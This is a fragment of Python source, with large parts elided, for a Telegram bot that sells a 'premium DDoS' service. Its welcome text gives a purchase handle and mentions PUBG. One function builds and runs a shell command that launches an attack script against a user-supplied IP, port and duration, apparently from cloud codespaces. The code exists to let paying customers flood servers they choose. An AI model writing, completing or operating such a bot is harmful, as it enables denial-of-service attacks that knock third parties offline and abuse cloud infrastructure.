...
FORWARD_CHANNEL_ID = -1002404034370
CHANNEL_ID = -1002404034370
error_channel_id = -1002404034370
...
async def run_attack_command_on_codespace(target_ip, target_port, duration):
    command = f"python3 LX.py {target_ip} {target_port} {duration}"
    try:
...
def send_welcome(message):
 ...
 #   btn1 = KeyboardButton("Instant Plan 🧡")
    ...
    bot.send_message(message.chat.id, '''*By  '❄️ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ 🔥ᴘʀᴇᴍɪᴜᴍ ᴅᴅᴏs ʙᴏᴛ  ᴛʜɪs ɪs ʜɪɢʜ ǫᴜᴀʟɪᴛʏ sᴇʀᴠᴇʀ ʙᴀsᴇᴅ ᴅᴅᴏs. ᴛᴏ ɢᴇᴛ ᴀᴄᴄᴇss.
 ☑️buy:- @Aditya789787
 (PUBG)
⠀⠀⠀⣴⣾⣿⣿⣶⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢸⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
